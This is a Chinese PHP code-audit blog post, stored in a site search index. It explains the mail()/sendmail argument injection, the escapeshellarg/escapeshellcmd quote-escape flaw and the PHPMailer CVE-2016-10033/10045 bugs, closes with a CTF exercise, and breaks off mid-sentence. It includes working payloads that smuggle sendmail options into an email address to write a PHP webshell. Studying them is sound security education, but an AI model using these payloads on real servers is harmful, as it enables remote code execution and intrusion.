<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【代码审计】PHP代码审计2</title>
      <link href="/2024/10/10/WebSecurity/codeaudit/phpaudit2/"/>
      <url>/2024/10/10/WebSecurity/codeaudit/phpaudit2/</url>
      
        <content type="html"><![CDATA[<h2 id="postcard"><a href="#postcard" class="headerlink" title="postcard"></a>postcard</h2><p>题目叫做明信片，代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png"><br><strong>漏洞解析</strong> ：</p><p>这道题其实是考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">mail</span> (</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$to</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$subject</span> ,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$message</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_headers</span> [,</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$additional_parameters</span> ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其参数含义分别表示如下：</p><blockquote><ul><li>to，指定邮件接收者，即接收人</li><li>subject，邮件的标题</li><li>message，邮件的正文内容</li><li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li><li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li></ul></blockquote><p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p><blockquote><ul><li><p>-O option &#x3D; value</p><p>QueueDirectory &#x3D; queuedir 选择队列消息</p></li><li><p>-X logfile</p><p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p></li><li><p>-f from email</p><p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p></li></ul></blockquote><p>举个简单例子方便理解: </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png"></p><p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> 中写入如下数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure><p>当然这题如果只是这一个问题的话，会显的太简单了，我们继续往下看，在 <strong>第3行</strong> 有这样一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure><p>这串代码的主要作用，是确保在第5个参数中只使用有效的电子邮件地址 <strong>$email</strong> 。我们先了解一下 <strong>filter_var()</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.filter-var.php">filter_var</a></strong> ：使用特定的过滤器过滤一个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</span><br></pre></td></tr></table></figure><p><strong>功能</strong> ：这里主要是根据第二个参数filter过滤一些想要过滤的东西。</p></blockquote><p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png"></p><p>当然由于引入的特殊符号，虽然绕过了 <strong>filter_var()</strong> 针对邮箱的检测，但是由于PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 <strong>escapeshellcmd()</strong> 函数处理转义，这样就没办法达到命令执行的目的了。 <strong>escapeshellcmd()</strong> 函数在底层代码如下（详细点 <a href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">这里</a> ）：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png"><br>因此我们继续往下看，在第七行有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure><p>这句代码主要是处理 <strong>$email</strong> 传入的数据。我们先来看一下 <strong>escapeshellarg</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></strong> — 把字符串转码为可以在 shell 命令里使用的参数</p><p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p><p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p></blockquote><p>具体功能作用，可以参考如下案例：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png"><br>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png"></p><p>详细分析一下这个过程：</p><ol><li><p>传入的参数是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure></li><li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure></li><li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure></li><li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p></li></ol><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png"></p><p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p><p>总结一下，这题实际上是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里实例分析选择 <strong>PHPMailer 命令执行漏洞</strong> （  <strong>CVE-2016-10045</strong> 和 <strong>CVE-2016-10033</strong> ）。项目代码可以通过以下方式下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/PHPMailer/PHPMailer</span><br><span class="line"><span class="built_in">cd</span> PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br></pre></td></tr></table></figure><h4 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>漏洞原理</p><p>在github上直接diff一下，对比一下不同版本的 <strong><a href="https://github.com/PHPMailer/PHPMailer/compare/v5.2.17...v5.2.18#diff-ace81e501931d8763b49f2410cf3094d">class.phpmailer.php</a></strong> 文件，差异如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png"></p><p>这里在 <strong>sendmailSend</strong> 函数中加了 <strong>validateAddress</strong> 函数，来针对发送的数据进行判断，判断邮箱地址的合法性。另外针对传入的数据，调用了 <strong>escapeshellarg</strong> 函数来转义特殊符号，防止注入参数。然而这样做，就引入了我们上面讨论的问题，即同时使用 <strong>escapeshellarg</strong> 函数和 <strong>escapeshellcmd()</strong> 函数，导致单引号逃逸。由于程序没有对传命令参数的地方进行转义，所以我们可以结合 <strong>mail</strong> 函数的第五个参数 <strong>-X</strong> 写入 <strong>webshell</strong> 。</p><p>下面详细看一下代码，漏洞具体位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码如下 ：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png"></p><p>在上图第12行处没有对 <strong>$params</strong> 变量进行严格过滤，只是简单地判断是否为 <strong>null</strong> ，所以可以直接传入命令。我们继续往下看，我们发现在上图第12行，当 <strong>safe_mode</strong> 模式处于关闭状态时， <strong>mail()</strong> 函数才会传入 <strong>$params</strong> 变量。<br>进一步跟跟进 <strong>$params</strong> 参数，看看它是怎么来的。这个参数的位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码，具体看下图 <strong>第11行</strong> ： </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png"></p><p>很明显 <strong>$params</strong> 是从 <strong>$this-&gt;Sender</strong> 传进来的，我们找一下 <strong>$this-&gt;Sender</strong> ，发现这个函数在 <strong>class.phpmailer.php</strong> 中，截取部分相关代码，具体看下图 <strong>第10行</strong> ：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png"></p><p>这里在 <strong>setFrom</strong> 函数中将 <strong>$address</strong> 经过某些处理之后赋值给 <strong>$this-&gt;Sender</strong> 。我们详细看看 <strong>$address</strong> 变量是如何处理的。主要处理函数均在 <strong>class.phpmailer.php</strong> 文件中，我们截取了部分相关代码，在下图 <strong>第三行</strong> 中使用了 <strong>validateAddress</strong> 来处理 <strong>$address</strong> 变量。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png"></p><p>所以跟进一下 <strong>validateAddress</strong> 函数，这个函数位置在 <strong>class.phpmailer.php</strong> 文件中。我们看看程序流程，相关代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png"></p><p>分析一下这段代码，大概意思就是对环境进行了判断，如果没有 <strong>prce</strong> 并且 <strong>php</strong> 版本 <strong>&lt;5.2.0</strong> ，则 <strong>$patternselect &#x3D; ‘noregex’</strong> 。接着往下看，在 <strong>class.phpmailer.php</strong> 文件中，有部分关于 <strong>$patternselect</strong> 的 <strong>swich</strong> 操作，我只选择了我们需要的那个，跟踪到下面的 <strong>noregex</strong> 。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png"></p><p>这里简单的只是根据 <strong>@</strong> 符号来处理字符，所以这里的payload很简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>然后通过 <strong>linux</strong> 自身的 <strong>sendmail</strong> 写log的方式，把log写到web根目录下。将日志文件后缀定义为 <strong>.php</strong> ，即可成功写入webshell。</p><h4 id="CVE-2016-10045-1"><a href="#CVE-2016-10045-1" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>diff一下5.2.20和5.2.18发现针对 <strong>escapeshellcmd</strong> 和 <strong>escapeshellarg</strong> 做了改动。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png"></p><p>这里其实有个很奇妙的漏洞，针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>但是，却可以使用下面这个  <strong>payload</strong> 进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure><p>实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了  <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png"></p><p>我们的 <strong>payload</strong> 最终在执行时变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-fa&#x27;\\&#x27;&#x27;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#x27;</span><br></pre></td></tr></table></figure><p>按照刚才上面的分析，我们将payload化简分割一下就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，这四个部分。最终的参数就是这样被注入的。</p><p>漏洞利用</p><p>漏洞有一些基本要求：<br><strong>1、php version &lt; 5.2.0</strong><br><strong>2、phpmailer &lt; 5.2.18</strong><br><strong>3、php 没有安装 pcre（no default）</strong><br><strong>4、safe_mode &#x3D; false（default）</strong></p><p>存在正则绕过之后，以及 <strong>escapeshellarg</strong>  和 <strong>escapeshellcmd</strong> 一起使用造成的神奇现象之后。</p><p>只需要 <strong>phpmailer &lt; 5.2.20</strong> </p><p><strong><a href="https://github.com/opsxcq/exploit-CVE-2016-10033">环境，poc，exp相关</a></strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>我们来看一下 <strong>PHPMailer</strong> 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 <strong>-f</strong> 参数（**-f** 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 <strong>mail</strong> 函数，也就不会造成命令执行），所以不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤，具体修复代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png"></p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 两个函数一起使用所产生的问题，有了更加深入的理解，文中用到的代码可以从 <a href="https://github.com/PHPMailer/PHPMailer">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#104;&#x6f;&#110;&#103;&#x72;&#x69;&#115;&#x65;&#x63;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#104;&#x6f;&#110;&#103;&#x72;&#x69;&#115;&#x65;&#x63;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a></strong> 联系我们。<strong>Day5</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题主要考察全局变量覆盖，结合 unset 函数绕过waf，以及通过 curl 读取文件，接下来我们将代码分为两个部分看看吧。我们看到 第11行-14行 有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这串代码的逻辑：<br>首先 第一行 ，循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。在 第二行 中先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。这里有个 可变变量 的概念需要先理解一下。可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png"></p><p>这里使用 <strong>$$</strong> 将通过 <strong>变量a</strong> 获取到的数据，注册成为一个<strong>新的变量</strong>（这里是 <strong>变量hello</strong> ）。然后会发现变量 <strong>$$a</strong> 的输出数据和变量 <strong>$hello</strong>  的输出数据一致（如上图，输出为 <strong>world</strong> ）。</p><p>我通过 <strong>GET</strong> 请求向 <strong>index.php</strong> 提交 <strong>flag&#x3D;test</strong> ，接着通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> 。当开始遍历 <strong>$_POST</strong> 超全局数组的时候， <strong>$__k</strong> 代表 <strong>_GET[flag]</strong> ，所以 <strong>$$__k</strong> 就是 <strong>$_GET[flag]</strong> ，即 <strong>test</strong> 值，此时 <strong>$$__k</strong> &#x3D;&#x3D; <strong>$__v</strong> 成立，变量 <strong>$_GET[flag]</strong> 就被 <strong>unset</strong> 了。但是在 <strong>第21行</strong> 和 <strong>22行</strong> 有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p> <strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。下面举个 <strong>extract</strong> 函数用例：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png"></p><p>接着到了24行比较两个变量的md5值，我们构造出2个0e开头的md5即可绕过，这样就进入第二阶段。</p><p>第二阶段主要考察 <strong>curl</strong> 读取文件。这里主要加了两个坑，我们之前说过的两个函数 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 一起使用的时候会造成的问题，主要看看这部分代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的 <strong>第8行</strong> 和 <strong>第9行</strong> 增加了两个过滤。</p><ul><li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> 和 <code>xFF</code>, 